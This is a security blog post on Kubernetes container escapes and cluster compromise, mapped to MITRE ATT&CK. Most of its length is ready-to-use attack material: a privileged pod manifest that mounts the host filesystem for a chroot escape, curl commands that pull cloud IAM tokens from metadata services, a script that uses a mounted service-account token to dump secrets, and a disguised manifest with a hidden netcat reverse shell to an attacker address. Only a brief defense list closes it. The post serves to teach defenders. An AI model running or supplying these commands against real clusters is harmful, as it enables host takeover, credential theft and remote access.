---
title: 'Container Escape Techniques: From Privileged Pods to Host Compromise'
description: 'Analyzing modern container breakout methods and defensive strategies for securing containerized environments'
pubDate: 'Dec 25 2024'
---

The Red Hat "State of Kubernetes Security Report" for 2024 (and the early data we're seeing in 2025) highlights a sobering reality: while everyone is migrating to K8s, security is often an afterthought. Organizations are pouring money into DevSecOps, but the complexity of the "K8s stack" keeps the door wide open for attackers.

In my research, I’ve found that cluster compromises rarely start with a "zero-day." Instead, they follow a predictable path: **Misconfiguration, RBAC Abuse, and Runtime Exploitation.**

Below is a breakdown of how I’ve mapped these trends to the MITRE ATT&CK framework and the actual commands used to execute them.

---

## The Attacker’s Mental Model

Before launching an exploit, an attacker needs to answer two fundamental questions:

1. **Where is it running?** (EKS, AKS, GKE, or a messy self-hosted cluster?)
2. **How do I talk to it?** (Do I have a stolen Service Account token, or am I hitting an exposed API?)

### Essential Tool: kubefwd

If you’re dealing with self-hosted clusters or need to bridge the gap between your local machine and a remote namespace, `kubefwd` is a lifesaver. It allows you to bulk port-forward services to your local machine as if they were running on `localhost`.

```bash
sudo KUBECONFIG=$HOME/.kube/config kubefwd services -n default --tui

```

---

## 1. API Server Misconfiguration (The Front Door)

**MITRE Mapping:** *T1190 (Exploit Public-Facing Application), T1611 (Escape to Host)*

"Cluster sprawl" is the enemy of security. In the rush to deploy, API servers or Dashboards are often left exposed with `system:anonymous` access enabled.

**The Walkthrough:**
An attacker scans for port `6443` or `443`. If they find the API server, they check for anonymous permissions:

```bash
# Testing for anonymous pod listing
curl -k https://<target-ip>:6443/api/v1/pods

```

If that returns a JSON list of pods instead of a `403 Forbidden`, the "Shadow Pod" attack begins. We deploy a privileged container that mounts the host's root filesystem.

**The Exploit (shadow.yaml):**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: shadow-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: shell
    image: ubuntu:latest
    command: [ "sleep", "infinity" ]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /

```

Once deployed, the attacker executes: `kubectl exec -it shadow-pod -- chroot /host`. **Game over.** You aren't just in a container; you are now root on the physical node.

---

## 2. Cloud Exploitation (The Pivot)

**MITRE Mapping:** *T1528 (Credential Access), T1611 (Escape/Pivot)*

Sometimes, the cluster itself isn't the target—it's just the bridge to the cloud provider (AWS, Azure, GCP). If an attacker gets RCE (Remote Code Execution) in a pod, they immediately look for the Instance Metadata Service (IMDS).

**The Walkthrough:**
Inside a compromised pod, we query the metadata endpoint to steal the node's IAM role:

* **AWS (EKS):**
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/NodeInstanceRole

```


* **GCP (GKE):**
```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

```



**Impact:** The attacker takes these temporary credentials, configures their local CLI, and starts exfiltrating data from S3 buckets or RDS databases, bypassing K8s logging entirely.

---

## 3. Leaked Service Account (The Silent Insider)

**MITRE Mapping:** *T1078 (Valid Accounts), T1528 (Token Theft)*

By default, Kubernetes mounts a Service Account (SA) token into every pod. If a pod’s RBAC is over-privileged (e.g., it can list secrets), any attacker who gets a shell in that pod becomes a cluster admin.

**The Walkthrough:**
The token lives at a predictable path: `/var/run/secrets/kubernetes.io/serviceaccount/token`.

```bash
# Extracting the token and querying the API from inside the pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Attempt to steal all secrets in the namespace
curl -s --cacert ${CA_CERT} --header "Authorization: Bearer ${TOKEN}" \
     -X GET https://kubernetes.default.svc/api/v1/namespaces/default/secrets

```

If the developers didn't follow the "Principle of Least Privilege," the attacker now has the base64-encoded credentials for your databases and third-party APIs.

---

## 4. Poisoned Image (The Supply Chain Hit)

**MITRE Mapping:** *T1190 (Initial Access), T1059 (Command Execution)*

Attackers don't always break in; sometimes, we invite them in. This happens via "typo-squatting" on public registries (e.g., pulling `ngnix` instead of `nginx`).

**The Walkthrough:**
The attacker creates a malicious image that looks legitimate but contains a hidden reverse shell in the entrypoint.

**The Malicious Manifest:**

```yaml
spec:
  containers:
  - name: payment-app
    image: python:3.9-slim # Looks innocent
    command: ["/bin/sh", "-c"]
    args:
      - |
        apt-get update && apt-get install -y netcat;
        nc -e /bin/sh 10.0.0.5 4444 & # Hidden callback to attacker
        python -m http.server 80;    # The "real" app

```

---

## Summary & Defense

Kubernetes security isn't about one "magic" fix. It's about layers:

1. **Disable Anonymous Auth:** Ensure `--anonymous-auth=false`.
2. **Restrict IMDS:** Use IMDSv2 and block metadata access from pods that don't need it.
3. **Audit RBAC:** Use tools like `rbac-lookup` to find over-privileged Service Accounts.
4. **Image Signing:** Use Admission Controllers to ensure only signed, scanned images from private registries can run.


